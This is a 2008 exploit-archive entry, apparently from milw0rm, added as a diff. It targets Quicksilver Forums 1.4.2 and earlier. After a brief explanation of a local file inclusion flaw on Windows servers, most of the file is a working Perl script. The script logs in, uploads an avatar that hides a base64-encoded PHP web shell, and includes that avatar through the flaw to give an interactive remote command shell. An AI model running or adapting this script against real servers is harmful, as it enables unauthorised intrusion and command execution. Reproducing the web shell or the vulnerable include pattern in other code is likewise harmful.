@@ -1,0 +1,258 @@
+# Author:	__GiReX__
+# Homepage:	girex.altervista.org
+
+# Date:		24/11/2008
+
+# CMS:		Quicksilver Forums <= 1.4.2
+# Site:		http://www.quicksilverforums.com/
+
+# Bug:		Local File Inclusion
+# Exploit:	Remote Command Execution
+
+# Note:		Works with windows servers only
+		Works regardless php.ini settings
+
+# Bug Discussion:
+
+# file: global.php
+# lines: 318-329
+
+	function get_lang($lang, $a = null, $path = './', $main = true)
+	{
+		if (isset($this->get['lang'])) {
+			$lang = $this->get['lang'];
+ 
+		}
+ 
+		if (strstr($lang, '/') || !file_exists($path . 'languages/' . $lang . '.php')) {
+			$lang = 'en';
+		}
+ 
+		include $path . 'languages/' . $lang . '.php';
+ 
+# As you can see, Quicksilver filter can be easily bypassed in windows servers
+# couse use of backslashes "\" in filesystem's paths.
+
+# Thanks to the functions uset_magic_quotes_gpc() this vuln works regardless php.ini setting
+
+# We can upload a malicious avatar and include it to have a RCE
+
+
+#!/usr/bin/perl 
+# Quicksilver Forums <= 1.4.2 RCE Exploit (win only)
+# Local File Inclusion / Malicious Avatar Upload
+# Coded by __GiReX__
+
+use IO::Socket::INET;
+use MIME::Base64;
+
+if(@ARGV < 3)
+{
+    banner();
+    print "[+] You need an user account to run this exploit\n\n";
+    print "[+] Usage: perl $0 <host> <path> <your_username> <your_pass>\n";
+    print "[+] Example: perl $0 localhost /quick/ test password\n";
+    exit;
+}
+
+my ($host, $path, $user, $pass) = @ARGV;
+
+$host =~ s/^http:\/\///;
+$host =~ s/^www\.//; 
+$target = "http://${host}${path}";
+
+banner();	
+check_vuln(); 
+
+$cookie = do_login() or debug($debug, 1); 
+upload_avatar() or debug($debug, 2);  
+
+while(1)
+{
+	print "[+] shell\@quick:\$ ";
+	chomp(my $cmd = <STDIN>);
+	
+	exit if $cmd eq 'exit';
+	create_socket();
+	
+	print $sd  "GET ${target}index.php?lang=..\\avatars\\uploaded\\${user_id}.png%00 HTTP/1.1\r\n".
+			   "Host: $host\r\n".
+			   "Cookie: $cookie\r\n".
+			   "CMD: ". encode_base64($cmd)."\r\n".
+			   "Connection: keep-alive\r\n\r\n";
+	
+	$out .= $_ while <$sd>;
+	
+	if($out =~ /-code-/)
+	{
+		$_out = substr($out, index($out, '-code-') + 6);  $n = index($_out, '-code');
+		$__out = substr($_out, 0, $n);
+	}
+	else
+	{
+		debug($out, 3);
+	}
+	
+	close($sd);
+	$out = undef;
+	
+	print STDOUT "\n". $__out."\n";
+}
+
+sub check_vuln
+{
+	create_socket();
+	
+	print $sd   "GET ${target}index.php?lang=..\\languages\\en.php%00 HTTP/1.1\r\n".
+				"Host: $host\r\n".
+				"Connection: keep-alive\r\n\r\n";
+				
+	while(my $res = <$sd>)
+	{
+		$ok = 1 if $res =~ /404 Not Found/;
+		
+		if($res =~ /<b>Fatal error<\/b>/)
+		{
+			close($sd);
+			return 1;
+		}
+		
+		our $debug .= $res;
+	}
+	
+	print STDOUT "\n[-] Server not vulnerable, maybe it's not a win server!\n" and exit
+	if not defined $ok;
+	
+	debug($debug, 0);
+}
+		
+
+sub do_login
+{     
+    create_socket();
+	my $data = "user=${user}&pass=${pass}&request_uri=%2F${path}%2Findex.php&submit=Invia";
+	
+	print $sd   "POST ${target}index.php?a=login&s=on HTTP/1.1\r\n" .
+				"Host: $host\r\n" .
+				"Connection: keep-alive\r\n" .
+				"Content-Type: application/x-www-form-urlencoded\r\n" .
+				"Content-Length: ". length($data)."\r\n\r\n" .
+				$data . "\r\n\r\n";
+    
+	
+	
+	while(my $res = <$sd>)
+	{
+		if($res =~ /Set-Cookie: (\w+)_user=([0-9]+)/)
+		{
+		    $prefix  = $1  unless $prefix; 
+		    $user_id = $2  unless $user_id;
+		}
+		elsif($res =~ /Set-Cookie: \w+_pass=([a-z0-9]{32})/)
+		{
+			my $hash_pwd = $1;  close($sd);
+			print STDOUT "\n[+] Logged in with $user account\n";
+			
+			return "${prefix}_user=${user_id}; ${prefix}_pass=${hash_pwd};";
+		}
+		
+		our $debug .= $res;
+	}	
+
+	close($sd);	
+	return undef;
+}
+
+sub upload_avatar
+{
+	create_socket();
+						# Image content + post's var base64 encoded
+    my $data =  "LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0yMjY0ODI3NDQ2MjM4MDUNCk".
+                 "NvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0idXNlcl9hdmF".
+                 "0YXJfd2lkdGgiDQoNCjUwDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t".
+                 "LTIyNjQ4Mjc0NDYyMzgwNQ0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kY".
+                 "XRhOyBuYW1lPSJ1c2VyX2F2YXRhcl9oZWlnaHQiDQoNCjUwDQotLS0tLS0tLS".
+                 "0tLS0tLS0tLS0tLS0tLS0tLS0tLTIyNjQ4Mjc0NDYyMzgwNQ0KQ29udGVudC1E".
+                 "aXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJ1c2VyX2F2YXRhcl90eXBlI".
+                 "g0KDQp1cGxvYWQNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMjI2ND".
+                 "gyNzQ0NjIzODA1DQpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5".
+                 "hbWU9ImF2YXRhcl91cGxvYWQiOyBmaWxlbmFtZT0iYXZhdF9hci5wbmciDQpD".
+                 "b250ZW50LVR5cGU6IGltYWdlL3BuZw0KDQo8P3BocA0KaWYoaXNzZXQoJF9TRV".
+                 "JWRVJbJ0hUVFBfQ01EJ10pKQp7CmVjaG8gIi1jb2RlLSI7IHBhc3N0aHJ1KGJ".
+                 "hc2U2NF9kZWNvZGUoJF9TRVJWRVJbJ0hUVFBfQ01EJ10pKTsgZWNobyAiLWNv".
+                 "ZGUiOwp9DQpkaWUoKTsNCj8+DQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tL".
+                 "S0tLTIyNjQ4Mjc0NDYyMzgwNQ0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS".
+                 "1kYXRhOyBuYW1lPSJzdWJtaXQiDQoNClN1Ym1pdA0KLS0tLS0tLS0tLS0tLS0t".
+                 "LS0tLS0tLS0tLS0tLS0yMjY0ODI3NDQ2MjM4MDUtLQ0K";
+				 
+	$data = decode_base64($data);
+
+	print $sd  "POST ${target}index.php?a=cp&s=avatar HTTP/1.1\r\n".
+			   "Host: $host\r\n" .
+			   "Connection: keep-alive\r\n" .
+			   "Cookie: $cookie\r\n" .
+               "Content-Type: multipart/form-data; boundary=---------------------------226482744623805\r\n" .
+               "Content-Length: ". length($data)."\r\n\r\n" .
+			   $data . "\r\n\r\n";
+		   
+	
+	while(my $res = <$sd>)
+	{
+		if($res =~ /Your avatar has been updated/)
+		{
+			print "[+] Malicious avatar uploaded\n\n";   close($sd);
+			return 1;
+		}
+		
+		our $debug 	.= $res;
+	}
+	
+	close($sd);
+	return undef;
+}
+
+sub create_socket
+{
+	our $sd = new IO::Socket::INET( 'PeerAddr' => $host,
+									'PeerPort' => '80',
+									'Proto'    => 'tcp',
+								   ) or die $@;
+}
+
+sub debug
+{
+	my $output = shift;
+	my $errno = shift;
+	
+	open(DEBUG, '>', 'debug.txt');
+	print DEBUG $debug;
+	
+	if($errno eq '0')
+	{
+		print STDOUT "\n[-] Unable to request index.php! See debug.txt for more infos\n";
+	}
+	if($errno eq '1')
+	{
+		print STDOUT "\n[-] Unable to login! See debug.txt for more infos.\n";
+	}
+	elsif($errno eq '2')
+	{
+		print STDOUT "\n[-] Unable to upload avatar! See debug.txt for more infos.\n";
+	}
+	elsif($errno eq '3')
+	{
+		print STDOUT "\n[-] Exploit mistake! See debug.txt for more infos.\n";
+	}
+	
+	close(DEBUG);
+	exit;
+}
+
+sub banner
+{
+	print STDOUT "\n[+] Quicksilver Forums <= 1.4.2 RCE Exploit (win only)\n".
+				 "[+] Local File Inclusion / Malicious Avatar Upload\n".
+				 "[+] Coded by __GiReX__\n\n";
+}
+
+# milw0rm.com [2008-11-24]
